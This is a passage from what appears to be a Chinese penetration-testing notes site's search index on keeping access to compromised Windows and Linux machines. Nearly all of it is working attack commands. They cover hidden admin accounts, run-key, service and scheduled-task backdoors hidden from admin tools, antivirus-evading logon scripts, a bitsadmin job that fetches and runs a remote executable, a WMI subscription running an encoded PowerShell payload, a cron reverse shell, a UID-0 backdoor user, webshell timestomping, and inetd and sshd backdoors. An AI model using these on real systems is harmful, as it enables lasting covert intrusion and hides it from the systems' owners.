\u4f46\u662f\u5176\u4ed6\u5982\u6ce8\u518c\u8868\uff0c\u7528\u6237\u7ba1\u7406\u754c\u9762\u548c\u767b\u9646\u754c\u9762\u90fd\u4f1a\u53d1\u73b0\u6b64\u7528\u6237\uff0c\u6240\u4ee5\u8bf4\u9690\u853d\u6027\u4e0d\u9ad8\u3002 \u4fee\u6539\u6ce8\u518c\u8868 \u6211\u4eec\u8981\u5bf9HEKY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\User \u8fdb\u884c\u4e00\u4e9b\u4fee\u6539\uff0c\u4f46\u662f\u9ed8\u8ba4\u8fd9\u6709SYSTEM\u53ef\u4ee5\u4fee\u6539SAM\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4fee\u6539\u4e00\u4e0b\u76f8\u5173\u6743\u9650\uff1a\u770b\u56fe\u8bf4\u8bdd \u5728names\u4e2d\u627e\u5230\u9690\u85cf\u7528\u6237\u5bf9\u5e94\u7684\u503c\uff0c\u7136\u540e\u53bb\u4e0a\u5c42\u6bd4\u5bf9\u3002 \u53ef\u4ee5\u53d1\u73b0\u9690\u85cf\u7528\u6237\u7684\u503c\u4e3a3f0\u3002\u63a5\u4e0b\u6765\u6211\u4eec\u628a1f4\uff08\u7ba1\u7406\u5458\u8868\u9879\uff09\u7684F\u503c\u590d\u5236\u52303f0\u4e2d\u3002 \u590d\u5236\u540e\uff0c\u5c063f0\u548c\u533f\u540d\u7528\u6237\u7684\u8868\u9879\u53f3\u952e\u5bfc\u51fa\u3002 \u7136\u540e\u628a\u6211\u4eec\u7684\u533f\u540d\u7528\u6237\u5220\u9664 \u7136\u540e\u53cc\u51fb\u4e24\u4e2a\u5bfc\u51fa\u7684\u8868\u9879. \u8fd9\u6837\u7684\u8bdd\uff0c\u6211\u4eec\u8fd9\u4e2a\u533f\u540d\u7528\u6237\u5c31\u53ea\u6709\u5728\u6ce8\u518c\u8868\u53ef\u89c1\u4e86\u3002 \u542f\u52a8\u9879 \u5f00\u59cb\u83dc\u5355\u542f\u52a8\u9879 C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup \u6709\u4e9b\u65f6\u5019\u8fd9\u4e2a\u6587\u4ef6\u5939\u4f1a\u6539\u53d8\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u6ce8\u518c\u8868\u952e\u503c\u6765\u786e\u5b9a HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders \u628a\u5e94\u7528\u7a0b\u5e8f\u7684\u5feb\u6377\u65b9\u5f0f\u653e\u8fdb\u53bb\u6709\u6548\uff0c\u4f46\u662f\u76f4\u63a5\u653e\u5e94\u7528\u7a0b\u5e8f\u8fdb\u53bb\u5c31\u4f1a\u5931\u6548\u3002 \u542f\u52a8\u9879\u6ce8\u518c\u8868\u540e\u95e8 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microft\\windows\\currentversion\\run \u547d\u4ee4 reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Keyname\" /t REG_SZ /d \"C:\\test.bat\" /f \u670d\u52a1 \u670d\u52a1\u540e\u95e8\u5f80\u5f80\u62e5\u6709SYSTEM\u6743\u9650 \u5c06exe\u6728\u9a6c\u6dfb\u52a0\u5230\u81ea\u542f\u52a8\u670d\u52a1\u4e2d sc create \"GoogleUpdated\" binpath= \"C:\\Users\\Administrator\\Desktop\\test.exe\" sc description \"GoogleUpdated\" \"description\" \u8bbe\u7f6e\u670d\u52a1\u7684\u63cf\u8ff0\u5b57\u7b26\u4e32 sc config \"GoogleUpdated\" start= auto \u8bbe\u7f6e\u8fd9\u4e2a\u670d\u52a1\u4e3a\u81ea\u52a8\u542f\u52a8 net start \"GoogleUpdated\" \u542f\u52a8\u670d\u52a1 \u5982\u679c\u76f4\u63a5\u7528\u666e\u901a\u540e\u95e8\u6765\u505a\u670d\u52a1\u540e\u95e8\uff0c\u90a3\u4e48\u5c31\u4f1a\u51fa\u95ee\u9898\uff1a windows\u4e0b\u7684\u670d\u52a1\u542f\u52a8\u540e\u82e5\u672a\u5728\u4e00\u5b9a\u65f6\u95f4\u5185\u4e0e\u670d\u52a1\u4e2d\u5fc3\u901a\u4fe1\u5219\u4f1a\u88ab\u7ec8\u6b62\u3002 \u4f46\u662fCS\u53ef\u4ee5\u76f4\u63a5\u751f\u6210\u670d\u52a1\u9a6c\u3002 \u8ba1\u5212\u4efb\u52a1 schtasks /create /sc minute /mo 5 /tn \"chrome\" /tr c:\\test.bat schtasks /create /sc minute /mo 1 /tn \"chrome\" /tr wscript.exe C:\\Users\\AppData\\Local\\Temp\\13442980_crypted.vbs schtasks /create /tn foo1 /tr C:\\Windows\\apppatch\\windows.exe /sc once /st 05:25 /S 18.217.*.* /RU System schtasks /create /s 192.168.1.2 /u administrator /p Passw0rd! /ru \"SYSTEM\" /tn adduser /sc DAILY /tr c:\\wmpub\\add.bat/F schtasks /create /s 192.168.1.2 /u administrator/p Passw0rd! /ru \"SYSTEM\" /tn adduser /sc DAILY /tr \\\\192.168.1.2\\c$\\windows\\beacon.exe schtasks /run /s 192.168.1.2 /u administrator /pPassw0rd! /tn adduser /i /s\u6307\u5b9a\u8fdc\u7a0b\u673a\u5668\u540d\u6216ip\u5730\u5740\uff0c/ru\u6307\u5b9a\u8fd0\u884c\u4efb\u52a1\u7684\u7528\u6237\u6743\u9650\uff0c\u8fd9\u91cc\u6307\u5b9a\u4e3a\u6700\u9ad8\u7684 SYSTEM \uff0c/tn\u662f\u4efb\u52a1\u540d\u79f0\uff0c/sc\u662f\u4efb\u52a1\u8fd0\u884c\u9891\u7387\uff0c\u8fd9\u91cc\u6307\u5b9a\u4e3a\u6bcf\u5929\u8fd0\u884c\uff0c\u5e76\u6ca1\u4ec0\u4e48\u5b9e\u9645\u610f\u4e49\uff0c/tr\u6307\u5b9a\u8fd0\u884c\u7684\u6587\u4ef6\uff0c/F\u8868\u793a\u5982\u679c\u6307\u5b9a\u7684\u4efb\u52a1\u5df2\u7ecf\u5b58\u5728\uff0c\u5219\u5f3a\u5236\u521b\u5efa\u4efb\u52a1\u5e76\u6291\u5236\u8b66\u544a\u3002/i\u8868\u793a \u7acb\u5373\u8fd0\u884c \u9690\u85cf \u4fee\u6539HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\test\u4e2d\u4efb\u52a1\u5bf9\u5e94\u7684index\u503c\uff08\u9ed8\u8ba43\uff09\uff0c\u4fee\u6539\u4e3a0\u3002\u65e0\u6cd5\u4fee\u6539\u65f6\u9700\u8981\u66f4\u6539\u6743\u9650\uff0c\u5c06\u6240\u6709\u8005\u6539\u4e3aadministrators\uff0c\u5e76\u8d4b\u4e88\u6240\u6709\u6743\u9650\u3002 \u8d4b\u4e88\u4e3a0\u540e\u65e0\u6cd5\u76f4\u63a5\u67e5\u770b\u4efb\u52a1\u3002 \u8fd9\u6837schtasks\u548c\u4efb\u52a1\u67e5\u770b\u5668\u5747\u4e0d\u80fd\u770b\u89c1\u6b64\u4efb\u52a1\u3002 \u6b64\u5916win10\u8fd8\u53ef\u4ee5\u5220\u9664C:\\Windows\\System32\\Tasks \u4e0b\u5bf9\u5e94\u4efb\u52a1\u540d\u7684\u6587\u4ef6\uff0c\u4ee5\u4fbf\u8fbe\u5230\u66f4\u597d\u7684\u9690\u85cf\u76ee\u7684\u3002\uff08win10\u4ee5\u5916\u7248\u672c \u5220\u9664\u6b64\u6587\u4ef6\u4f1a\u5bfc\u81f4\u4efb\u52a1\u65e0\u6cd5\u8fd0\u884c\uff09 \u4f46\u8fd9\u79cd\u9690\u85cf\u65b9\u5f0f\u53ef\u4ee5\u7528\u547d\u4ee4 schtasks /query /tn \u4efb\u52a1\u540d\u6765\u67e5\u770b\uff08\u4efb\u52a1\u540d\u53ef\u4ee5\u901a\u8fc7\u6ce8\u518c\u8868\u67e5\u770b\uff09\u3002 \u4e3a\u4e86\u907f\u514d\u88ab\u8fd9\u6837\u6392\u67e5\u51fa\u6765\uff0c\u5728win10\u4e0b\u53ef\u4ee5\u5220\u9664C:\\Windows\\System32\\Tasks \u4e0b\u5bf9\u5e94\u6587\u4ef6\u5e76\u5220\u9664HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\test\u4e2dSD\u503c Logon Scripts Logon Scripts\u4f18\u5148\u4e8e av \u5148\u6267\u884c\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u4e00\u70b9\u6765\u7ed5\u8fc7 av \u7684\u654f\u611f\u64cd\u4f5c\u62e6\u622a \u5728HKEY_CURRENT_USER\\Environment\u8868\u9879\u521b\u5efa\u4e00\u4e2a\u503c\u4e3a UserInitMprLogonScript ,\u503c\u4e3a\u6211\u4eec\u8981\u542f\u52a8\u7684\u7a0b\u5e8f\u8def\u5f84\u3002 \u7528\u6237\u91cd\u65b0\u767b\u9646\u540e\u540e\u95e8\u88ab\u542f\u52a8\u3002 WIN7\u53ef\u884c \u7ec4\u7b56\u7565\u540e\u95e8 \u5f00\u59cb->\u8fd0\u884c->\u952e\u5165\"gpedit.msc\"->\u672c\u5730\u7ec4\u7b56\u7565\u7f16\u8f91\u5668->window\u8bbe\u7f6e(system)->\u811a\u672c->\u542f\u52a8->\u5c5e\u6027 \u70b9\u51fb\u663e\u793a\u6587\u4ef6: C:\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\Startup \u628a\u6211\u4eec\u7684\u540e\u95e8\u7a0b\u5e8f\u590d\u5236\u5230\u8fd9\u4e2a\u8def\u5f84,\u7136\u540e\u8fd9\u4e2a\u811a\u672c\u5f00\u673a\u5c31\u4f1a\u81ea\u52a8\u52a0\u8f7d\u6267\u884c\u4e86\u3002 win7\u4e0b\u590d\u73b0\u5931\u8d25\u3002\u53cd\u6b63\u6709\u8fd9\u4e2a\u73a9\u610f\uff0c\u6211\u770b\u522b\u4eba\u62ff2003\u590d\u73b0\u6210\u529f\u4e86\uff0c\u5bb9\u6613\u88ab\u67e5\u6740\u3002 \u5f53\u7136\u4e5f\u53ef\u4ee5\u5728\u57df\u63a7\u673a\u5668\u4e0a\u901a\u8fc7\u7ec4\u7b56\u7565\u4e0b\u53d1\u6b64\u811a\u672c\u6765\u4f7f\u57df\u4e2d\u4eba\u5458\u767b\u9646\u65f6\u4e0a\u7ebf\u3002\u4e0d\u8fc7\u8fd9\u4e0d\u5728\u672c\u6587\u8ba8\u8bba\u8303\u7574\u4e4b\u5185\u4e86\u3002 \u542f\u7528GUEST Guest\u7528\u6237\u672c\u8eab\u5c31\u5b58\u5728\u4e8e\u8ba1\u7b97\u673a\u4e2d\uff0c\u4f46\u662f\u4e00\u822c\u9ed8\u8ba4\u7981\u6b62\uff0c\u4e14\u4e0d\u53ef\u767b\u5f55\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\u6fc0\u6d3bGuest\u7528\u6237\u5e76\u8d4b\u4e88\u7ba1 \u7406\u5458\u6743\u9650\uff0c\u5e76\u5141\u8bb8\u8fdc\u7a0b\u684c\u9762\u767b\u5f55\u3002 net user Guest /active:yes net user Guest guest@123456 net localgroup Administrators Guest /ADD gpedit.msc->\u8ba1\u7b97\u673a\u914d\u7f6e->windows\u8bbe\u7f6e->\u5b89\u5168\u8bbe\u7f6e->\u672c\u5730\u7b56\u7565->\u7528\u6237\u6743\u9650\u5206\u914d->\u5141\u8bb8\u901a\u8fc7\u8fdc\u7a0b\u684c\u9762\u670d\u52a1\u767b\u5f55 \u6dfb\u52a0Guest BITSADMIN\u540e\u95e8 bitsadmin\u6307\u4ee4\u4e00\u822c\u662f\u7528\u4e8e\u4e0b\u8f7d\u6587\u4ef6\u7684\uff0c\u4f46\u5b83\u4e5f\u53ef\u4ee5\u7528\u4e8e\u6301\u4e45\u5316\u3002 bitsadmin\u7684SetNotifyCmdLine\u53c2\u6570\u610f\u662f\u7528\u4e8e\u4e0b\u8f7d\u6587\u4ef6\u540e\u7d27\u968f\u5176\u540e\u8c03\u7528\u4e00\u4e2a\u547d\u4ee4\uff0c\u4f46\u662f\u8fd9\u4e2a\u53c2\u6570\u88ab\u9ed1\u5ba2\u5229\u7528\u540e\u5c31\u6210\u4e86\u4e00\u4e2a\u5f88\u4e0d\u9519\u7684\u540e\u95e8\u3002 bitsadmin /create backdoor \u521b\u5efa\u4e00\u4e2abitsadmin\u4efb\u52a1backdoor bitsadmin /addfile backdoor http://a.com/a.exe c:\\temp\\a.exe \u6dfb\u52a0\u4e00\u4e2a\u4efb\u52a1\u5217\u8868\uff0c\u5c06\u8fdc\u7a0b\uff08\u672c\u5730\uff09\u7684\u4e00\u4e2a\u6587\u4ef6\u4e0b\u8f7d\u5230\u672c\u5730 bitsadmin /SetNotifyCmdLine backdoor c:\\users\\hacker\\evil.exe nul \u5012\u6570\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u8981\u6253\u5f00\u7684\u5e94\u7528\u7a0b\u5f0f\uff0c\u5012\u6570\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u6253\u5f00\u6587\u4ef6\u65f6\u9644\u52a0\u7684\u53c2\u6570 bitsadmin /SetMinRetryDelay \"backdoor\" 60 \u6bcf60\u79d2\u91cd\u8bd5\u4efb\u52a1 bitsadmin /resume backdoor \u8c03\u7528\u6307\u5b9a\u4efb\u52a1 \u6211\u4eec\u6267\u884c\u5b8c\u4ee5\u4e0a\u6307\u4ee4\u540e\uff0c\u4f1a\u9a6c\u4e0a\u547d\u4ee4\u6267\u884c\u4e00\u6b21\uff08SetNotifyCmdLine\u4e2d\u6307\u5b9a\u7684cmd\u547d\u4ee4\uff0c\u8fd9\u91cc\u6211\u4eec\u5c31\u662f\u4ec5\u4ec5\u6267\u884c\u4e86\u6211\u4eec\u7684\u6076\u610fEXE\uff09\u3002 \u91cd\u542f\u540e\u53d1\u73b0\u4efb\u52a1\u4f9d\u7136\u5b58\u5728 \u6309\u7406\u8bf4\u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4\u6211\u7684\u9a6c\u5c31\u4f1a\u88ab\u6267\u884c\u4e00\u6b21\uff0c\u4f46\u5b9e\u9645\u4e0a\u5e76\u6ca1\u6709\uff0c\u4e0d\u77e5\u9053\u4e3a\u4f55\u3002 WMI \u4f7f\u7528WMI\u5b58\u50a8\u4fe1\u606f \u4f60\u53ef\u4ee5\u7528WMI\u6765\u5b58\u50a8\u4f60\u7684shellcode,\u6076\u610f\u6587\u4ef6\u8def\u5f84\u7b49\uff0c\u8fd9\u79cd\u5b58\u50a8\u65b9\u5f0f\u76f8\u5bf9\u6765\u8bf4\u6bd4\u8f83\u9690\u853d $StaticClass = New-Object Management.ManagementClass('root\\cimv2',$null,$null) #\u65b0\u5efawmi\u7c7b $StaticClass.Name = \"a\" #\u8bbe\u7f6ewmi\u7c7b\u540d $StaticClass.Properties.Add('key',\"shellcode\") #\u8bbe\u7f6ewmi\u5c5e\u6027\u952e\u503c $StaticClass.put() #\u63d0\u4ea4\u4ee5\u4e0a\u66f4\u6539 ##\u8bbf\u95ee\u4fe1\u606f ([WmiClass] 'a').Properties['key'].Value \u8fc7\u6ee4\u5668+\u5904\u7406\u5668 \u8fd9\u4e2a\u540e\u95e8\u662f\u8fd9\u4e48\u5b9e\u73b0\u7684 1.\u8bbe\u5b9a\u4e00\u4e2a\u4e8b\u4ef6\u8fc7\u6ee4\u5668\uff0c\u7528\u4e8e\u76d1\u542c\u4e8b\u4ef6\u5982\u5f00\u673a\uff0c\u542f\u52a8\u67d0\u5e94\u7528\u7b49\u7b49 2.\u8bbe\u5b9a\u4e00\u4e2a\u4e8b\u4ef6\u5904\u7406\u5668\uff0c\u7528\u4e8e\u8bbe\u7f6e\u76d1\u542c\u5230\u67d0\u4e8b\u4ef6\u53d1\u751f\u540e\u6240\u91c7\u53d6\u7684\u884c\u52a8 3.\u5c06\u8fc7\u6ee4\u5668\u548c\u5904\u7406\u5668\u7ed1\u5b9a\u5728\u4e00\u8d77 $$EncodedPayload=\"\" ## \u6784\u9020 WMI\u6c38\u4e45\u4e8b\u4ef6\u8ba2\u9605(permanent event subscriptions) $filterName='EvilFilter' $consumerName='EvilConsumer' ## 1. \u521b\u5efa\u4e00\u4e2a \u4e8b\u4ef6\u8fc7\u6ee4\u5668__EventFilter,\u7528\u4e8e\u8bbe\u5b9a\u89e6\u53d1\u6761\u4ef6,\u6bcf\u969460s\u6267\u884c\u4e00\u6b21 $Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\" ## or $Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320\" ## \u4e8b\u4ef6\u7b5b\u9009\u5668\u5728\u7cfb\u7edf\u542f\u52a8\u540e\u7684 200 \u548c 320 \u79d2\u4e4b\u95f4\u88ab\u5f53\u4f5c\u4e00\u4e2a\u89e6\u53d1\u5668\u3002\u5728\u4e8b\u4ef6\u88ab\u89e6\u53d1\u65f6\u4e8b\u4ef6\u6d88\u8d39\u8005\u4f1a\u4f7f\u7528 CommandLineEventConsumer \u6267\u884c\u5df2\u6307\u5b9a\u597d\u7684\u53ef\u6267\u884c\u6587\u4ef6\u3002 $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace \"root\\subscription\" -Arguments @{Name=$filterName;EventNameSpace=\"root\\cimv2\";QueryLanguage=\"WQL\";Query=$Query} -ErrorAction Stop ## 2. \u521b\u5efa\u4e00\u4e2a \u4e8b\u4ef6\u6d88\u8d39\u8005 CommandLineEventConsumer ,\u7528\u4e8e\u8bbe\u5b9a\u6267\u884c\u7684\u64cd\u4f5c $Arg =@{Name=$consumerName;CommandLineTemplate=\"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonInteractive -enc $EncodedPayload\"} $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\\subscription\" -Arguments $Arg ## 3. \u7ed1\u5b9afilter\u548cconsumer Set-WmiInstance -Class __FilterToConsumerBinding -Namespace \"root\\subscription\" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer} \u6587\u4ef6\u9690\u85cf attrib +s +h ./a +s:\u8bbe\u7f6e\u4e3a\u7cfb\u7edf\u6587\u4ef6\uff0c\u66f4\u5177\u6709\u8ff7\u60d1\u6027\uff0c\u4e14\u6743\u9650\u8f83\u9ad8 +h:\u9690\u85cf\u6587\u4ef6","title":"win\\&linux\u672c\u5730\u6743\u9650\u7ef4\u6301"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#winlinux","text":"","title":"win\\&amp;linux\u672c\u5730\u6743\u9650\u7ef4\u6301"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_1","text":"LINUX cron \u9690\u85cf\u6587\u4ef6 \u521b\u5efa\u6076\u610f\u7ba1\u7406\u5458\u7528\u6237 \u65f6\u95f4\u6233\u4fee\u6539 inetd \u5feb\u901f\u83b7\u53d6ssh\u94fe\u63a5(\u8f6f\u8fde\u63a5\u540e\u95e8) Wrapper\u540e\u95e8 SSH keylogger WINDOWS \u5f71\u5b50\u7528\u6237 \\$ \u7b26\u53f7 \u4fee\u6539\u6ce8\u518c\u8868 \u542f\u52a8\u9879 \u5f00\u59cb\u83dc\u5355\u542f\u52a8\u9879 \u542f\u52a8\u9879\u6ce8\u518c\u8868\u540e\u95e8 \u670d\u52a1 \u8ba1\u5212\u4efb\u52a1 \u9690\u85cf Logon Scripts \u7ec4\u7b56\u7565\u540e\u95e8 \u542f\u7528GUEST BITSADMIN\u540e\u95e8 WMI \u4f7f\u7528WMI\u5b58\u50a8\u4fe1\u606f \u8fc7\u6ee4\u5668+\u5904\u7406\u5668 \u6587\u4ef6\u9690\u85cf","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#linux","text":"","title":"LINUX"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#cron","text":"\u521b\u5efa\u4e2a\u6587\u4ef6\uff08\u5047\u8bbe\u4e3a/a/b)\uff0c\u91cc\u9762\u7684\u6838\u5fc3\u5185\u5bb9\u662f\u5f39\u4e2ashell\u56de\u6765 \uff08\u6700\u597d\u5728\u6587\u4ef6\u524d\u52a0\u4e0a#!/bin/bash\uff09 \u7136\u540echmod +xs /a/b \u7136\u540e\u4fee\u6539/etc/crontab,\u8fd9\u91cc\u662f\u6bcf\u5206\u949f\u6267\u884c\u4e00\u6b21 */1 * * * * root /a/b \u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u65e0\u6587\u4ef6\u843d\u5730\u3002 \u4f46\u662f\u9700\u8981\u4fee\u6539\u4e00\u4e2a\u5730\u65b9 vim /etc/crontab \u5c06SEHLL\u6539\u4e3a/bin/bash \u7136\u540e\u5199\u5165 bash -i >& /dev/tcp/xxx/xxx 0>&1","title":"cron"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_2","text":"\u521b\u5efa.xxx\u6587\u4ef6\u5373\u4e3a\u9690\u85cf\u6587\u4ef6\uff0cls\u662f\u770b\u4e0d\u5230\u7684\uff0c\u53ea\u6709\u901a\u8fc7ls -al\u624d\u80fd\u770b\u5230 \u7f51\u4e0a\u8fd8\u770b\u5230\u4e00\u4e2a\u521b\u5efa\u6587\u4ef6\u540d\u5b57\u4e3a...\u7684\u65b9\u6cd5\uff0c\u4e0d\u77e5\u9053\u5b9e\u7528\u6027\u5982\u4f55","title":"\u9690\u85cf\u6587\u4ef6"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_3","text":"useradd -o -u 0 backdoor \u7136\u540e\u4e3a\u5176\u8bbe\u7f6e\u4e2a\u5bc6\u7801\u4ee5\u4fbfssh\u767b\u5f55\uff0c\u767b\u4e0a\u53bb\u5c31\u662froot","title":"\u521b\u5efa\u6076\u610f\u7ba1\u7406\u5458\u7528\u6237"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_4","text":"\u540e\u95e8\u7684\u65f6\u95f4\u6233\u9700\u8981\u6539\u6539\uff0c\u4e0d\u7136\u592a\u5bb9\u6613\u88ab\u770b\u51fa\u6765\uff0c\u522b\u4eba\u4e00\u4e2als -al\u5c31\u770b\u7834\u4e86 touch -r index.php webshell.php \u5c06index.php\u7684\u65f6\u95f4\u8d4b\u4e88webshell.php touch -t 1401021042.30 webshell.php 2014\u5e741\u67082\u65e510\u70b942\u520630\u79d2\u8d4b\u4e88webshell.php","title":"\u65f6\u95f4\u6233\u4fee\u6539"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#inetd","text":"\u9700\u8981inetd\u88ab\u5b89\u88c5 apt-get install openbsd-inetd \u4fee\u6539\u6587\u4ef6/etc/inetd.conf \u7136\u540e\u91cd\u542finetd ps -ef | grep inetd root 1928 1470 0 14:20 pts/0 00:00:00 grep inetd kill 1928 \u7136\u540e\u53e6\u4e00\u53f0\u4e3b\u673a nc -vv ip 13(\u9ed8\u8ba4\u7aef\u53e313) \u5373\u53ef\u83b7\u5f97\u4ee5\u4e0b\u573a\u666f \u9ed8\u8ba4\u7aef\u53e3\u6539\u6cd5: \u4fee\u6539/etc/services\u6587\u4ef6\uff0c\u52a0\u5165\u4ee5\u4e0b\u7684\u4e1c\u897f test 6666/tcp \u7136\u540e\u4fee\u6539/etc/inetd.conf ,\u5728daytime\u9644\u8fd1 test stream tcp nowait root /bin/bash bash -i","title":"inetd"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#ssh","text":"ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337; \u53d7\u5bb3\u673a\u4e0a\u6267\u884c \u7136\u540e\u6211\u4eec ssh root@xxx.x.x.xx -p 31337 \u968f\u4fbf\u8f93\u4e2a\u5bc6\u7801\u5c31\u8fdb\u53bb\u4e86","title":"\u5feb\u901f\u83b7\u53d6ssh\u94fe\u63a5(\u8f6f\u8fde\u63a5\u540e\u95e8)"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#wrapper","text":"cd /usr/sbin mv sshd ../bin echo '#!/usr/bin/perl' >sshd echo 'exec \"/bin/sh\" if (getpeername(STDIN) =~ /^..4A/);' >>sshd echo 'exec {\"/usr/bin/sshd\"} \"/usr/sbin/sshd\",@ARGV,' >>sshd chmod u+x sshd //\u4e0d\u7528\u91cd\u542f\u4e5f\u884c /etc/init.d/sshd restart kali\u4e0b\u7684\u6267\u884c ##!bash socat STDIO TCP4:192.168.206.142:22,sourceport=13377 \u5373\u53ef\u5f00\u59cb\u63a7\u5236 \u6e90\u7aef\u53e3\u4fee\u6539 ##!python >>> import struct >>> buffer = struct.pack('>I6',19526) >>> print repr(buffer) '\\x00\\x00LF' >>> buffer = struct.pack('>I6',13377) >>> print buffer 4A 